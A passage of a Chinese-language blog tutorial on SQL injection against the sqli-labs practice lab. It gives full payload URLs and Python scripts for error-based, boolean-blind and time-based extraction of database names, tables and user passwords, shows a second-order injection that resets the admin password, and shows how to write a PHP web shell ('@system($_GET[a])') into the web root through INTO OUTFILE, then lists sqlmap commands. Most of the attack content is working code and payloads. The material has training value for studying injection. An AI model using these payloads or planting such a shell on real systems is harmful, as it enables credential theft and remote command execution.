user())a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212032354.png" alt="image-20231221203250121"></p><p>这样就可以看到当前用户了，也可以修改参数，查看当前数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212034136.png" alt="image-20231221203443056"></p><h4><span id="用postman进行注入">用Postman进行注入</span></h4><p>有些页面不能展现所有的返回数据，并且在浏览器的地址栏也不能进行post请求，所以可以使用软件postman来进行这些操作，方便好用。</p><p>在浏览器打开开发者工具，找到网络，清空后点击页面请求api的按钮，看到响应是json数据的一般就是api接口了</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212040039.png" alt="image-20231221204026429"></p><h4><span id="基于布尔的盲注">基于布尔的盲注</span></h4><p>​布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例</p><p>我们输入正确的id，显示You are in …..</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212048262.png" alt="image-20231221204838365"></p><p>我们输入错误的语句如id&#x3D;1’ ，或者id&#x3D;-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212049759.png" alt="image-20231221204903839"></p><p>构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212050940.png" alt="image-20231221205004587"></p><p>用python脚本来判断当前的数据库名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id=1&#x27;and ascii(substring(database(),1,1))=115--+</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tr=<span class="string">&#x27;You are in&#x27;</span></span><br><span class="line">name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://192.168.2.70/sqli/Less-8/?id=1&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">123</span>):</span><br><span class="line">        url=url1+<span class="string">&quot; &#x27; and ascii(substring(database(),&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;,1))= &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;-- -&quot;</span></span><br><span class="line">        response= requests.get(url)</span><br><span class="line">        con=response.text</span><br><span class="line">        <span class="keyword">if</span> tr <span class="keyword">in</span> con:</span><br><span class="line">            name=name+<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212055979.png" alt="image-20231221205522722"></p><p>将上述代码修改为二分法的写法，执行速度会更快</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.59/sqli/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        begin =<span class="number">32</span></span><br><span class="line">        end =<span class="number">128</span></span><br><span class="line">        tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end :</span><br><span class="line">            paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">db()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212100012.png" alt="image-20231221210042984"></p><p>以下是盲注的一些常用语法：</p><h5><span id="1判断数据库类型">1，判断数据库类型</span></h5><pre><code>MySQL数据库表      information_schema.tablesaccess            msysobjects SQLServer         sysobjects</code></pre><p>用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from information_schema.tables) --+</span><br><span class="line">//判断是否是 access数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from msysobjects) --+</span><br><span class="line">//判断是否是 Sqlserver数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from sysobjects) --+</span><br></pre></td></tr></table></figure><h5><span id="2判断当前数据库名">2，判断当前数据库名</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1：判断当前数据库的长度，利用二分法</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;5 --+  //正常显示</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;10 --+  //不显示任何数据</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;7 --+  //正常显示</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;8 --+  //不显示任何数据</span><br><span class="line"> </span><br><span class="line">  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符</span><br><span class="line"> </span><br><span class="line">2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line">//判断数据库的第一个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span><br><span class="line">//判断数据库的第二个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),2,1))&gt;100 --+</span><br><span class="line">//判断数据库的第三个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span><br><span class="line">...........</span><br><span class="line">由此可以判断出当前数据库为 security</span><br></pre></td></tr></table></figure><h5><span id="3判断当前库的表名">3，判断当前库的表名</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//猜测当前数据库中是否存在admin表</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from admin) --+</span><br><span class="line">1：判断当前数据库中表的个数</span><br><span class="line">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br><span class="line"> </span><br><span class="line">2：判断每个表的长度</span><br><span class="line">//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span><br><span class="line">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+</span><br><span class="line"> </span><br><span class="line">3：判断每个表的每个字符的ascii值</span><br><span class="line">//判断第一个表的第一个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br><span class="line">//判断第一个表的第二个字符的ascii值               </span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 --+</span><br><span class="line">.........</span><br><span class="line">由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</span><br></pre></td></tr></table></figure><h5><span id="4-判断表的字段">4， 判断表的字段</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select username from admin) </span><br><span class="line">  </span><br><span class="line">1：判断表中字段的个数</span><br><span class="line">//判断users表中字段个数是否大于5</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)&gt;5 --+</span><br><span class="line"> </span><br><span class="line">2：判断每个字段的长度</span><br><span class="line">//判断第一个字段的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1))&gt;5 --+</span><br><span class="line">//判断第二个字段的长度   </span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))&gt;5 --+</span><br><span class="line"> </span><br><span class="line">3：判断每个字段名字的ascii值</span><br><span class="line">//判断第一个字段的第一个字符的ascii</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+</span><br><span class="line">//判断第一个字段的第二个字符的ascii</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))&gt;100 --+</span><br><span class="line">...........</span><br><span class="line"> </span><br><span class="line">由此可判断出users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure><h5><span id="5爆字段中的数据">5，爆字段中的数据</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</span><br><span class="line"> </span><br><span class="line">1: 判断数据的长度</span><br><span class="line">// 判断id字段的第一个数据的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 0,1))&gt;5 --+</span><br><span class="line">// 判断id字段的第二个数据的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 1,1))&gt;5 --+</span><br><span class="line"> </span><br><span class="line">2：判断数据的ascii值</span><br><span class="line">// 判断id字段的第一行数据的第一个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</span><br><span class="line">// 判断id字段的第二行数据的第二个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+</span><br><span class="line">...........</span><br></pre></td></tr></table></figure><h5><span id="6修改后的python代码">6,修改后的python代码</span></h5><p>根据以上可以将之前的python代码修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.59:808/sqli/Less-7/?id=1&#x27;))&quot;</span></span><br><span class="line">resu=<span class="string">&#x27;Use outfile&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zhix</span>(<span class="params">num</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">        begin =<span class="number">32</span></span><br><span class="line">        end =<span class="number">128</span></span><br><span class="line">        tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end :</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">1</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">elif</span>(num==<span class="number">2</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">elif</span>(num==<span class="number">3</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">elif</span>(num==<span class="number">4</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr((select group_concat(id,username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;输入错误！&#x27;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            <span class="keyword">if</span> resu <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    num=<span class="number">4</span></span><br><span class="line">    zhix(num)</span><br></pre></td></tr></table></figure><p>修改num的值为1，2，3，4来破解数据库，表，字段和数据！</p><h4><span id="基于时间的盲注">基于时间的盲注</span></h4><p>​也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用绝招：延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id&#x3D;1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(5) --+    </span><br></pre></td></tr></table></figure><p>如图所示，观察请求的时间线，大概在5秒以上，说明构造的sleep(5) 语句起作用，可以把这个时间线作为sql 注入的判断依据。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231825272.png" alt="img"></p><p>想要获取数据库名字，延时注入与布尔盲注类似，构造方法如下，提交参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br><span class="line">if(expr1,expr2,expr3)       如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</span><br></pre></td></tr></table></figure><p>代码的含义就是如果数据库名字的第一个字符的acsii值为115，则进行延时，否则返回0即什么都不返回。</p><p>基于以上我们可以编写python脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># ?id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">tr=&#x27;username&#x27;</span><br><span class="line">name=&#x27;&#x27;</span><br><span class="line">url1=&quot;http://192.168.2.70/sqli/Less-9/?id=1&#x27;&quot;</span><br><span class="line">for j in range(1,10):</span><br><span class="line">    for i in range(65,123):</span><br><span class="line">        url=url1+&quot;and if( ascii(substring(database(),&quot;+str(j)+&quot;,1))= &quot;+str(i)+&quot;,sleep(3),1)-- -&quot;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        elapsed_time = end_time - start_time</span><br><span class="line">        if elapsed_time &gt; 3:  # 如果响应时间超过5秒</span><br><span class="line">            name=name+chr(i)</span><br><span class="line">            print(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231832700.png" alt="image-20231223183211995"></p><p>此后与盲注的步骤类似！</p><p>若睡眠sleep（）函数被禁用可以用BENCHMARK来替换，示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.70/sqli/Less-9/?id=1&#x27; and If(ascii(substr(database(),1,1))=114,1,BENCHMARK(5000000, SHA1(&#x27;Hello World&#x27;)))-- -</span><br></pre></td></tr></table></figure><h4><span id="二次注入">二次注入</span></h4><p>​二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时，对其中的特殊字符进行了转义处理；但在恶意数据插入到数据库时，被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p><p>（1）查看初始 users 表，发现初始 users 表中账号 admin 的密码为 admin</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231944762.png" alt="img" style="zoom:50%;"><p>（2）注册用户，在网站注册名为 admin’– - 密码为 123456 的用户</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231945163.png" alt="img" style="zoom:50%;"><p>（3）修改用户密码，我们先查看一下此时的 users 表，发现多了一个用户 admin’– -，</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231946825.png" alt="img" style="zoom: 33%;"><p>修改用户 admin’– - 的密码</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231946490.png" alt="img" style="zoom: 50%;"><p>再一次查看 users 表，发现用户 admin‘– - 的密码并没有被修改，而是用户 admin 的密码被修改了。于是我们就有了 admin 的账户密码。</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231947710.png" alt="img" style="zoom: 50%;"><p>原因：在网站设计时，虽然过滤了注册的信息，把特殊字符进行了转义，但是在从数据库调用从外部保存下来的数据时，并没有进行过滤，使得“admin’– -”被代入到 sql 语句执行，执行了这段 payload，达到了修改用户 admin 的密码的目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#原语句</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; </span><br><span class="line"> </span><br><span class="line">#插入 payload 后的语句</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;-- -&#x27; and password=&#x27;$curr_pass&#x27; </span><br><span class="line">#此时 &#x27;admin&#x27; 后的语句被注释</span><br><span class="line"> </span><br><span class="line">#真正的生效的语句</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;</span><br><span class="line">#从而达到了修改用户 admin 密码的目的</span><br></pre></td></tr></table></figure><h4><span id="基于sql注入拿到webshell">基于SQL注入拿到webshell</span></h4><p>1，MySQL数据库的配置文件My.ini中的secure_file_priv为空 ，如下， 意思就是不限制数据的导入和导出操作，即能够上传木马文件 </p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231843773.png" alt="image-20231223184333443" style="zoom: 80%;"><p>2，利用SQL注入获取MySQL的地址并且检查secure_file_priv是否为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59:808/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,@@secure_file_priv -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231849015.png" alt="image-20231223184921962"></p><p>利用@@datadir和@@secure_file_priv两个函数获取MySQL的绝对路径，password后面没有东西说明secure_file_priv为空</p><p>3，在网站的根目录下写入文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59:808/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php phpindo();  ?&gt;&quot; into outfile &quot;C:\\phpStudy_64\\sqli\\WWW\\php1.php&quot; -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231855794.png" alt="image-20231223185543527"></p><p>网站根目录下出现文件说明写入文件成功！</p><p>4，注入一句话木马，拿到webs hell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59:808/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);   ?&gt;&quot; into outfile &quot;C:\\phpStudy_64\\sqli\\WWW\\php2.php&quot; -- -</span><br></pre></td></tr></table></figure><p>其中@system($_GET[a]);是指以管理员身份运行拿到的a参数中的指令，C:\phpStudy_64\sqli\WWW\php2.php是文件的绝对路径</p><p>打开<a href="http://192.168.2.59:808/php2.php%E6%9C%89%E9%A1%B5%E9%9D%A2%E8%AF%B4%E6%98%8E%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F%EF%BC%81">http://192.168.2.59:808/php2.php有页面说明注入成功！</a></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231859342.png" alt="image-20231223185905934"></p><p>5，执行指令，例如查看系统信息</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231901162.png" alt="image-20231223190058923"></p><h4><span id="sqlmap">SQLmap</span></h4><p>SQLmap是一款自动化SQL注入工具，kali自带，如果想要在Windows中使用则需要安装，解压即用，下载地址为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip</span><br></pre></td></tr></table></figure><p>使用SQLmap需要提前安装好python环境</p><p>SQLmap常用指令：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231905144.png" alt="在这里插入图片描述"><p>进入SQLmap的解压目录用cmd打开后，查看帮助文档</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -h</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231916717.png" alt="image-20231223191626302"></p><p>以sqli第一关为例，查看有哪些数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py  -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot;  --batch --dbs</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231921716.png" alt="image-20231223192119772"></p><p>查看security数据库下有那些表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 